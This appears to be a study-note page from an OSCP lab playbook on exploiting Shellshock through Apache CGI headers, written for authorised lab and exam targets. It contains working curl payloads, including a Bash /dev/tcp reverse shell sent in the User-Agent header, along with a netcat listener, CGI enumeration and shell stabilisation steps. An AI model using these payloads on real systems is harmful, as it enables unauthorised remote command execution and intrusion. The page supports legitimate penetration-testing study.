# Linux - Shellshock CGI

**Step 10C of 50 · Linux/Web**

*Confirm Bash command injection through an Apache CGI header, then convert the proof into a controlled callback.*

> [!warning] 💡 Scope
> Use this page only when the target is an authorised lab or exam system and a CGI endpoint has been found. Start with a harmless identity command. Do not send a callback until the response proves command execution.

## Run this

> **Why:** CGI scripts receive request headers through the process environment. The Shellshock test checks whether the target Bash parser executes text appended after a function-style header value.

First confirm that the discovered script behaves normally:

~~~bash
curl -si "http://$BoxIP:$WebPort/cgi-bin/$Script"
~~~

Then send an identity-only proof:

~~~bash
curl -si "http://$BoxIP:$WebPort/cgi-bin/$Script" \
  -H 'User-Agent: () { :; }; echo; echo; /usr/bin/id'
~~~

Read the response body and look for a uid line. This proves command execution and identifies the CGI execution account.

## What did you get?

- [ ] The response contains the expected uid line -> **Save the response, set $Username to the execution account, and continue to the callback below**
- [ ] The CGI script returns 200 but the header is ignored -> **Confirm the interpreter, test another CGI file, and inspect the response for a normal script output**
- [ ] The CGI directory returns 403 -> **Keep the directory finding and enumerate direct filenames below /cgi-bin/**
- [ ] The server returns 500 or times out -> **Remove the callback payload, retry the harmless identity proof once, and preserve the complete response**
- [ ] No CGI endpoint is found -> **Return to [[Linux - Web Enum]] and test other discovered paths, extensions, and source clues**

## Direct CGI enumeration

> **Why:** Web servers commonly forbid directory listing while still serving known CGI files. Enumerate the directory as a separate content-discovery target.

~~~bash
gobuster dir -u "http://$BoxIP:$WebPort/cgi-bin/" \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x sh,cgi,pl,py \
  -o "$BoxDir/loot/gobuster-cgi.txt"
~~~

Check each useful result manually:

~~~bash
curl -si "http://$BoxIP:$WebPort/cgi-bin/$Script"
~~~

## Callback

> **Why:** The listener must be ready before the CGI request starts Bash. The payload uses Bash's /dev/tcp feature, so keep Bash explicit and use a separate local callback port.

Terminal 1, on Kali:

~~~bash
nc -lvnp "$Lport"
~~~

Terminal 2, on Kali:

~~~bash
curl --max-time 10 -si "http://$BoxIP:$WebPort/cgi-bin/$Script" \
  -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1"
~~~

Run identity checks immediately after the connection:

~~~bash
id
whoami
hostname
~~~

If the HTTP request does not return, check the listener. A request can remain open because the CGI process is now attached to the shell.

## Shell stabilisation

Continue to [[Linux - Shell Stabilise]] after the callback:

~~~bash
stty raw -echo
fg
~~~

Press Enter once after fg, then set the terminal type if needed:

~~~bash
export TERM=xterm
~~~

## Gotchas 💡

- Do not interpret a 403 directory response as a dead end. Direct CGI files can still return 200.
- Use id first. A callback failure after a positive proof is a listener, route, port, or quoting problem, not necessarily a failed Shellshock test.
- Keep $WebPort and $Lport distinct. The target service port and the Kali listener port are different roles.
- /dev/tcp is a Bash feature. If Bash is not the interpreter, use a compatible payload for the confirmed shell.
- A CGI request may hang once the reverse shell is connected. The listener output is the success signal.
- stty raw -echo changes the local terminal. Keep reset ready.
- Do not paste flag values, passwords, or hashes into the write-up or shared command reference.

## Related stages

- [[Linux - Web Enum]]
- [[Linux - RCE to Shell]]
- [[Linux - Shell Stabilise]]
- [[Linux - Local Enum]]
- [[Linux - Sudo Check]]
- [[Linux - Clean Down]]

## Seen in

- [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]] -- direct CGI enumeration, Shellshock identity proof, and Bash callback

## External Resources

- [NVD: CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
- [Exploit-DB: Shellshock CGI](https://www.exploit-db.com/exploits/34900)
- [RevShells](https://www.revshells.com/)

## Why this matters for OSCP

This page turns a memorable vulnerability into a repeatable route: discover the CGI file, prove command execution safely, catch the shell, and only then move into local enumeration.
